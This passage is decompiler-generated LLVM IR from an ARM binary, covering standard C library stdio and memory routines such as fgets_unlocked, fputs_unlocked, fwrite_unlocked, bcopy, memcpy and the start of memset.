  store i32 58724, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r1.global-to-local, align 4
  %v1_c5d4 = call i32 @__pthread_return_void()
  %v0_c5d8 = load i32, i32* @r4, align 4
  store i32 %v0_c5d8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r3.global-to-local, align 4
  %v1_c5e4 = call i32 @__pthread_return_0()
  store i32 %v1_c5e4, i32* %r0.global-to-local, align 4
  %v0_c5e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c5e8

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c5bc
  %v0_c5fc = phi i32 [ %v0_c5bc, %dec_label_pc_c5ac ], [ %v0_c5e8.pre, %dec_label_pc_c5bc ]
  %v1_c5e8 = inttoptr i32 %v0_c5fc to i32*
  %v2_c5e8 = load i32, i32* %v1_c5e8, align 4
  %v0_c5ec = load i32, i32* %sl.global-to-local, align 4
  %v2_c5ec = or i32 %v0_c5ec, %v2_c5e8
  %v1_c5f0 = xor i32 %v2_c5ec, 320
  store i32 %v1_c5f0, i32* %r3.global-to-local, align 4
  %v1_c5f4 = and i32 %v1_c5f0, 832
  %v2_c5f4 = icmp eq i32 %v1_c5f4, 0
  store i1 %v2_c5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c5f4, label %dec_label_pc_c5fc, label %bb39

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5e8
  store i32 %v0_c5fc, i32* @r0, align 4
  %v0_c600 = call i32 @__stdio_wcommit()
  store i32 %v0_c600, i32* %r0.global-to-local, align 4
  %v2_c604 = icmp eq i32 %v0_c600, 0
  store i1 %v2_c604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c604, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_c5fc
  %v1_c608 = load i32, i32* @r6, align 4
  %v2_c608 = inttoptr i32 %v1_c608 to i32*
  %v3_c608 = load i32, i32* %v2_c608, align 4
  store i32 %v3_c608, i32* %r3.global-to-local, align 4
  %v2_c60c = add i32 %v1_c608, 8
  %v3_c60c = inttoptr i32 %v2_c60c to i32*
  %v4_c60c = load i32, i32* %v3_c60c, align 4
  %v2_c610 = and i32 %v3_c608, -65
  store i32 %v2_c610, i32* %r3.global-to-local, align 4
  %v4_c614 = sdiv i32 %v3_c608, 256
  store i32 %v4_c614, i32* %r1.global-to-local, align 4
  %v3_c618 = add i32 %v1_c608, 28
  %v4_c618 = inttoptr i32 %v3_c618 to i32*
  store i32 %v4_c60c, i32* %v4_c618, align 4
  %v1_c61c = load i32, i32* %r1.global-to-local, align 4
  %v2_c61c = trunc i32 %v1_c61c to i8
  %v3_c61c = load i32, i32* @r6, align 4
  %v4_c61c = add i32 %v3_c61c, 1
  %v5_c61c = inttoptr i32 %v4_c61c to i8*
  store i8 %v2_c61c, i8* %v5_c61c, align 1
  %v0_c620.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c620.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_c620 = load i32, i32* %r3.global-to-local, align 4
  %v2_c620 = trunc i32 %v1_c620 to i8
  %v3_c620 = load i32, i32* @r6, align 4
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v2_c620, i8* %v4_c620, align 1
  %v0_c624.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c624.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_c5fc, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_c5e8, %.thread6, %.thread7
  %v2_c62c = load i32, i32* @global_var_1d4bc.421, align 4
  store i32 %v2_c62c, i32* %r3.global-to-local, align 4
  %v7_c630 = icmp eq i32 %v2_c62c, 2
  store i1 %v7_c630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c630, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_c4f8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 58724)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_c5a0, %bb40
  %v0_c648 = load i32, i32* @r6, align 4
  %v1_c648 = add i32 %v0_c648, 32
  %v2_c648 = inttoptr i32 %v1_c648 to i32*
  %v3_c648 = load i32, i32* %v2_c648, align 4
  store i32 %v3_c648, i32* @r6, align 4
  %v2_c64c = icmp eq i32 %v3_c648, 0
  store i1 %v2_c64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c64c, label %dec_label_pc_c64c.dec_label_pc_c654_crit_edge, label %dec_label_pc_c5a0

dec_label_pc_c64c.dec_label_pc_c654_crit_edge:    ; preds = %.thread11
  %v0_c654.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c654

dec_label_pc_c654:                                ; preds = %dec_label_pc_c64c.dec_label_pc_c654_crit_edge, %dec_label_pc_c510
  %v0_c654 = phi i32 [ %v0_c654.pre, %dec_label_pc_c64c.dec_label_pc_c654_crit_edge ], [ %v1_c590, %dec_label_pc_c510 ]
  %v1_c654 = call i32 @_stdio_openlist_dec_use(i32 %v0_c654)
  store i32 %v1_c654, i32* %r0.global-to-local, align 4
  %v0_c698.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_c65c:                                ; preds = %dec_label_pc_c504
  %v1_c65c = inttoptr i32 %.v1_c4f0 to i8*
  %v2_c65c = load i8, i8* %v1_c65c, align 1
  %v3_c65c = zext i8 %v2_c65c to i32
  %v1_c660 = and i32 %v3_c65c, 64
  store i32 %v1_c660, i32* %r3.global-to-local, align 4
  %v2_c660 = icmp eq i32 %v1_c660, 0
  store i1 %v2_c660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c660, label %bb41, label %dec_label_pc_c66c

bb41:                                             ; preds = %dec_label_pc_c65c
  br label %bb43

dec_label_pc_c66c:                                ; preds = %dec_label_pc_c65c
  %v0_c66c = call i32 @__stdio_wcommit()
  store i32 %v0_c66c, i32* %r0.global-to-local, align 4
  %v2_c670 = icmp eq i32 %v0_c66c, 0
  store i1 %v2_c670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c670, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_c66c
  %v1_c674 = load i32, i32* %r8.global-to-local, align 4
  %v2_c674 = inttoptr i32 %v1_c674 to i32*
  %v3_c674 = load i32, i32* %v2_c674, align 4
  store i32 %v3_c674, i32* %r3.global-to-local, align 4
  %v2_c678 = add i32 %v1_c674, 8
  %v3_c678 = inttoptr i32 %v2_c678 to i32*
  %v4_c678 = load i32, i32* %v3_c678, align 4
  store i32 %v4_c678, i32* %r1.global-to-local, align 4
  %v2_c67c = and i32 %v3_c674, -65
  store i32 %v2_c67c, i32* %r3.global-to-local, align 4
  %v4_c680 = sdiv i32 %v3_c674, 256
  %v2_c684 = trunc i32 %v4_c680 to i8
  %v4_c684 = add i32 %v1_c674, 1
  %v5_c684 = inttoptr i32 %v4_c684 to i8*
  store i8 %v2_c684, i8* %v5_c684, align 1
  %v0_c688.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c688.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_c688 = load i32, i32* %r1.global-to-local, align 4
  %v2_c688 = load i32, i32* %r8.global-to-local, align 4
  %v3_c688 = add i32 %v2_c688, 28
  %v4_c688 = inttoptr i32 %v3_c688 to i32*
  store i32 %v1_c688, i32* %v4_c688, align 4
  %v1_c68c = load i32, i32* %r3.global-to-local, align 4
  %v2_c68c = trunc i32 %v1_c68c to i8
  %v3_c68c = load i32, i32* %r8.global-to-local, align 4
  %v4_c68c = inttoptr i32 %v3_c68c to i8*
  store i8 %v2_c68c, i8* %v4_c68c, align 1
  %v0_c690.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c690.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_c66c
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_c654, %.thread20
  %v0_c698 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_c698.pre, %dec_label_pc_c654 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_c698, i32* %r0.global-to-local, align 4
  store i32 %v3_c4e4, i32* @r4, align 4
  ret i32 %v0_c698

; uselistorder directives
  uselistorder i32 %v0_c698, { 1, 0 }
  uselistorder i32 %v3_c648, { 1, 2, 0 }
  uselistorder i32 %v2_c4f8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 11, 4, 5, 6, 7, 8, 9, 10, 14, 12, 13 }
  uselistorder i32* bitcast (i32** @global_var_1d488.430 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_1dc04.410, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c5e8, { 1, 0 }
  uselistorder label %dec_label_pc_c5a0, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_c6cc = icmp eq i32 %arg2, 0
  store i1 %v2_c6cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_c754, label %dec_label_pc_c738.preheader

dec_label_pc_c738.preheader:                      ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_c73815 = add i32 %arg2, -1
  store i32 %v1_c73815, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_c73821 = icmp eq i32 %arg2, 1
  store i1 %v7_c73821, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c73821, label %dec_label_pc_c744, label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c738.preheader, %dec_label_pc_c738.backedge
  %v1_c73c24.in = phi i32 [ %v0_c73c.pre, %dec_label_pc_c738.backedge ], [ %arg3, %dec_label_pc_c738.preheader ]
  %v1_c6e4 = add i32 %v1_c73c24.in, 16
  %v2_c6e4 = inttoptr i32 %v1_c6e4 to i32*
  %v3_c6e4 = load i32, i32* %v2_c6e4, align 4
  store i32 %v3_c6e4, i32* %r2.global-to-local, align 4
  %v1_c6e8 = add i32 %v1_c73c24.in, 24
  %v2_c6e8 = inttoptr i32 %v1_c6e8 to i32*
  %v3_c6e8 = load i32, i32* %v2_c6e8, align 4
  %v3_c6ec = icmp uge i32 %v3_c6e4, %v3_c6e8
  store i1 %v3_c6ec, i1* %cpsr_c.global-to-local, align 1
  %v9_c6ec = icmp eq i32 %v3_c6e4, %v3_c6e8
  store i1 %v9_c6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6ec, label %dec_label_pc_c70c, label %dec_label_pc_c6f4

dec_label_pc_c6f4:                                ; preds = %dec_label_pc_c6e4
  %v1_c6f4 = inttoptr i32 %v3_c6e4 to i8*
  %v2_c6f4 = load i8, i8* %v1_c6f4, align 1
  %v5_c6f4 = add i32 %v3_c6e4, 1
  store i32 %v5_c6f4, i32* %r2.global-to-local, align 4
  %v2_c6f8 = load i32, i32* @r4, align 4
  %v3_c6f8 = inttoptr i32 %v2_c6f8 to i8*
  store i8 %v2_c6f4, i8* %v3_c6f8, align 1
  %v0_c6fc = load i32, i32* @r4, align 4
  %v1_c6fc = inttoptr i32 %v0_c6fc to i8*
  %v2_c6fc = load i8, i8* %v1_c6fc, align 1
  %v5_c6fc = add i32 %v0_c6fc, 1
  store i32 %v5_c6fc, i32* @r4, align 4
  %v2_c700 = icmp ugt i8 %v2_c6fc, 9
  store i1 %v2_c700, i1* %cpsr_c.global-to-local, align 1
  %v7_c700 = icmp eq i8 %v2_c6fc, 10
  store i1 %v7_c700, i1* %cpsr_z.global-to-local, align 1
  %v0_c704 = load i32, i32* %r2.global-to-local, align 4
  %v1_c704 = load i32, i32* @r5, align 4
  %v2_c704 = add i32 %v1_c704, 16
  %v3_c704 = inttoptr i32 %v2_c704 to i32*
  store i32 %v0_c704, i32* %v3_c704, align 4
  br i1 %v7_c700, label %dec_label_pc_c744, label %dec_label_pc_c738.backedge

dec_label_pc_c70c:                                ; preds = %dec_label_pc_c6e4
  %v1_c73c24 = inttoptr i32 %v1_c73c24.in to i8*
  %v3_c70c = call i32 @getc_unlocked(i8* %v1_c73c24)
  %v4_c70c = trunc i32 %v3_c70c to i8
  %v5_c710 = icmp eq i8 %v4_c70c, -1
  store i1 %v5_c710, i1* %cpsr_c.global-to-local, align 1
  %v10_c710 = icmp eq i32 %v3_c70c, -1
  store i1 %v10_c710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_c710, label %dec_label_pc_c718, label %dec_label_pc_c734

dec_label_pc_c718:                                ; preds = %dec_label_pc_c70c
  %v0_c718 = load i32, i32* @r5, align 4
  %v1_c718 = inttoptr i32 %v0_c718 to i8*
  %v2_c718 = load i8, i8* %v1_c718, align 1
  %v1_c71c = and i8 %v2_c718, 8
  %v2_c71c = icmp eq i8 %v1_c71c, 0
  store i1 %v2_c71c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c71c, label %dec_label_pc_c744, label %dec_label_pc_c754

dec_label_pc_c734:                                ; preds = %dec_label_pc_c70c
  %v3_c728 = load i32, i32* @r4, align 4
  %v4_c728 = inttoptr i32 %v3_c728 to i8*
  store i8 %v4_c70c, i8* %v4_c728, align 1
  %v0_c72c = load i32, i32* @r4, align 4
  %v1_c72c = inttoptr i32 %v0_c72c to i8*
  %v2_c72c = load i8, i8* %v1_c72c, align 1
  %v5_c72c = add i32 %v0_c72c, 1
  store i32 %v5_c72c, i32* @r4, align 4
  %v2_c730 = icmp ugt i8 %v2_c72c, 9
  store i1 %v2_c730, i1* %cpsr_c.global-to-local, align 1
  %v7_c730 = icmp eq i8 %v2_c72c, 10
  store i1 %v7_c730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c730, label %dec_label_pc_c744, label %dec_label_pc_c738.backedge

dec_label_pc_c738.backedge:                       ; preds = %dec_label_pc_c734, %dec_label_pc_c6f4
  %v0_c738.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_c73c.pre = load i32, i32* @r5, align 4
  %v1_c738 = add i32 %v0_c738.pre, -1
  store i32 %v1_c738, i32* %r6.global-to-local, align 4
  %v2_c738 = icmp ne i32 %v0_c738.pre, 0
  store i1 %v2_c738, i1* %cpsr_c.global-to-local, align 1
  %v7_c738 = icmp eq i32 %v0_c738.pre, 1
  store i1 %v7_c738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c738, label %dec_label_pc_c744, label %dec_label_pc_c6e4

dec_label_pc_c744:                                ; preds = %dec_label_pc_c738.preheader, %dec_label_pc_c734, %dec_label_pc_c738.backedge, %dec_label_pc_c6f4, %dec_label_pc_c718
  %v0_c744 = load i32, i32* @r4, align 4
  %v1_c744 = load i32, i32* %r7.global-to-local, align 4
  %v3_c744 = icmp uge i32 %v0_c744, %v1_c744
  store i1 %v3_c744, i1* %cpsr_c.global-to-local, align 1
  %v9_c744 = icmp eq i32 %v0_c744, %v1_c744
  store i1 %v9_c744, i1* %cpsr_z.global-to-local, align 1
  %v2_c748 = xor i1 %v9_c744, true
  %v3_c748 = and i1 %v3_c744, %v2_c748
  br i1 %v3_c748, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_c744
  %v7_c74c = inttoptr i32 %v0_c744 to i8*
  store i8 0, i8* %v7_c74c, align 1
  %v0_c750.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_c750.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_c744, %bb
  %v1_c750 = phi i1 [ %v1_c750.pre, %bb ], [ %v9_c744, %dec_label_pc_c744 ]
  %v0_c750 = phi i1 [ %v0_c750.pre, %bb ], [ %v3_c744, %dec_label_pc_c744 ]
  %v2_c750 = xor i1 %v1_c750, true
  %v3_c750 = and i1 %v0_c750, %v2_c750
  br i1 %v3_c750, label %.dec_label_pc_c758_crit_edge, label %dec_label_pc_c754

.dec_label_pc_c758_crit_edge:                     ; preds = %.thread7
  %v0_c758.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c758

dec_label_pc_c754:                                ; preds = %entry, %dec_label_pc_c718, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %.dec_label_pc_c758_crit_edge, %dec_label_pc_c754
  %v0_c758 = phi i32 [ %v0_c758.pre, %.dec_label_pc_c758_crit_edge ], [ 0, %dec_label_pc_c754 ]
  ret i32 %v0_c758

; uselistorder directives
  uselistorder i1 %v9_c744, { 1, 0, 2 }
  uselistorder i32 %v1_c744, { 1, 0 }
  uselistorder i32 %v0_c744, { 0, 2, 1 }
  uselistorder i32 %v0_c738.pre, { 2, 0, 1 }
  uselistorder i1 %v2_c71c, { 1, 0 }
  uselistorder i32 %v3_c6e4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_c73c24.in, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder label %dec_label_pc_c758, { 1, 0 }
  uselistorder label %dec_label_pc_c754, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_c744, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_c760 = load i32, i32* @r4, align 4
  store i32 %v3_c760, i32* %stack_var_-16, align 4
  %v6_c760 = load i32, i32* @r5, align 4
  %v9_c760 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_c76c = call i32 @strlen(i8* %arg1)
  store i32 %v3_c76c, i32* @r6, align 4
  %v0_c774 = load i32, i32* @r5, align 4
  %v0_c778 = load i32, i32* @r4, align 4
  %v5_c784 = inttoptr i32 %v0_c774 to i8*
  %v6_c784 = call i32 @__GI_fwrite_unlocked(i32 %v0_c778, i32 1, i32 %v3_c76c, i8* %v5_c784)
  %v1_c788 = load i32, i32* @r6, align 4
  %v9_c788 = icmp eq i32 %v6_c784, %v1_c788
  br i1 %v9_c788, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_c790 = phi i32 [ %v6_c784, %entry ], [ -1, %bb ]
  %v2_c790 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c790, i32* @r4, align 4
  store i32 %v6_c760, i32* @r5, align 4
  store i32 %v9_c760, i32* @r6, align 4
  ret i32 %v14_c790

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_c794 = load i32, i32* @r6, align 4
  %v12_c794 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_c79c = load i8, i8* %arg4, align 1
  %v4_c79c = zext i8 %v3_c79c to i32
  %v1_c7a0 = and i32 %v4_c79c, 192
  store i32 %v1_c7a0, i32* %r3.global-to-local, align 4
  %v2_c7a4 = icmp eq i32 %v1_c7a0, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_c7a4, label %dec_label_pc_c7cc, label %dec_label_pc_c7c0

dec_label_pc_c7c0:                                ; preds = %entry
  %v4_c7c0 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_c7c4 = icmp eq i32 %v4_c7c0, 0
  br i1 %v2_c7c4, label %dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge, label %dec_label_pc_c834

dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge:    ; preds = %dec_label_pc_c7c0
  %v0_c7cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c7cc

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge, %entry
  %v0_c7d41 = phi i32 [ %v0_c7cc.pre, %dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge ], [ %arg2, %entry ]
  %v2_c7cc = icmp eq i32 %v0_c7d41, 0
  br i1 %v2_c7cc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_c7cc
  br label %dec_label_pc_c834

bb:                                               ; preds = %dec_label_pc_c7cc
  %v1_c7d0 = load i32, i32* @r6, align 4
  %v3_c7d0 = icmp eq i32 %v1_c7d0, 0
  br i1 %v3_c7d0, label %dec_label_pc_c834, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %bb
  %v2_c7e0 = udiv i32 -1, %v0_c7d41
  %v0_c7e8 = load i32, i32* @r4, align 4
  store i32 %v0_c7e8, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_c7d0, %v2_c7e0
  br i1 %tmp10, label %dec_label_pc_c80c, label %dec_label_pc_c7f4

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0
  %v0_c7ec = load i32, i32* @r7, align 4
  %v2_c7f4 = mul i32 %v1_c7d0, %v0_c7d41
  %v4_c7f8 = call i32 @__stdio_fwrite(i32 %v0_c7ec, i32 %v2_c7f4, i32 %v0_c7e8)
  %v0_c7fc = load i32, i32* @r5, align 4
  %v2_c800 = udiv i32 %v4_c7f8, %v0_c7fc
  store i32 %v2_c800, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c80c:                                ; preds = %dec_label_pc_c7e0
  %v1_c80c = inttoptr i32 %v0_c7e8 to i32*
  %v2_c80c = load i32, i32* %v1_c80c, align 4
  %v1_c810 = or i32 %v2_c80c, 8
  store i32 %v1_c810, i32* %r3.global-to-local, align 4
  %v3_c814 = sdiv i32 %v2_c80c, 256
  store i32 %v3_c814, i32* %r2.global-to-local, align 4
  %v1_c818 = trunc i32 %v3_c814 to i8
  %v3_c818 = add i32 %v0_c7e8, 1
  %v4_c818 = inttoptr i32 %v3_c818 to i8*
  store i8 %v1_c818, i8* %v4_c818, align 1
  %v0_c81c = load i32, i32* %r3.global-to-local, align 4
  %v1_c81c = trunc i32 %v0_c81c to i8
  %v2_c81c = load i32, i32* @r4, align 4
  %v3_c81c = inttoptr i32 %v2_c81c to i8*
  store i8 %v1_c81c, i8* %v3_c81c, align 1
  %v0_c820 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c82c = inttoptr i32 %v0_c820 to i32*
  store i32 22, i32* %v2_c82c, align 4
  %v0_c838.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c834:                                ; preds = %.thread, %dec_label_pc_c7c0, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c80c, %dec_label_pc_c7f4, %dec_label_pc_c834
  %v0_c838 = phi i32 [ %v0_c838.pre, %dec_label_pc_c80c ], [ %v2_c800, %dec_label_pc_c7f4 ], [ 0, %dec_label_pc_c834 ]
  store i32 %v9_c794, i32* @r6, align 4
  store i32 %v12_c794, i32* @r7, align 4
  ret i32 %v0_c838

; uselistorder directives
  uselistorder i32 %v3_c814, { 1, 0 }
  uselistorder i32 %v1_c7d0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_c838, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c834, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_c84c = inttoptr i32 %arg2 to i8*
  %v3_c84c = call i32 @_memcpy(i8* %v2_c84c, i32 %arg1)
  ret i32 %v3_c84c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_c850 = load i32, i32* @r0, align 4
  %v1_c850 = load i32, i32* @r1, align 4
  %v2_c850 = inttoptr i32 %v0_c850 to i8*
  %v3_c850 = call i32 @_memcpy(i8* %v2_c850, i32 %v1_c850)
  ret i32 %v3_c850
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_c864 = load i32, i32* @r2, align 4
  %v8_c864 = icmp eq i32 %v0_c864, 8
  store i1 %v8_c864, i1* %cpsr_z.global-to-local, align 1
  %v5_c868 = icmp slt i32 %v0_c864, 8
  br i1 %v5_c868, label %dec_label_pc_c8c8, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %entry
  %v4_c86c = mul i32 %arg2, 256
  %v5_c86c = or i32 %v4_c86c, %arg2
  %v4_c870 = mul i32 %v5_c86c, 65536
  %v5_c870 = or i32 %v4_c870, %v5_c86c
  store i32 %v5_c870, i32* %r1.global-to-local, align 4
  %v1_c87457 = urem i32 %tmp, 4
  %v2_c87458 = icmp eq i32 %v1_c87457, 0
  store i1 %v2_c87458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_c87458, label %dec_label_pc_c884, label %bb

bb:                                               ; preds = %dec_label_pc_c86c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_c86c ]
  %v3_c87859 = phi i32 [ %v6_c878, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_c86c ]
  %v4_c878 = inttoptr i32 %v3_c87859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_c878, align 1
  %v5_c878 = load i32, i32* %r3.global-to-local, align 4
  %v6_c878 = add i32 %v5_c878, 1
  store i32 %v6_c878, i32* %r3.global-to-local, align 4
  %v0_c87c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_c888.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_c87c.pr, label %dec_label_pc_c884, label %.thread

.thread:                                          ; preds = %bb
  %v2_c87c = add i32 %v0_c888.pr.pre, -1
  store i32 %v2_c87c, i32* @r2, align 4
  %v1_c874 = urem i32 %v6_c878, 4
  %v2_c874 = icmp eq i32 %v1_c874, 0
  store i1 %v2_c874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c874, label %dec_label_pc_c884, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_c878.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_c878.pre to i8
  br label %bb

dec_label_pc_c884:                                ; preds = %.thread, %bb, %dec_label_pc_c86c
  %v0_c89028 = phi i32 [ %tmp, %dec_label_pc_c86c ], [ %v6_c878, %bb ], [ %v6_c878, %.thread ]
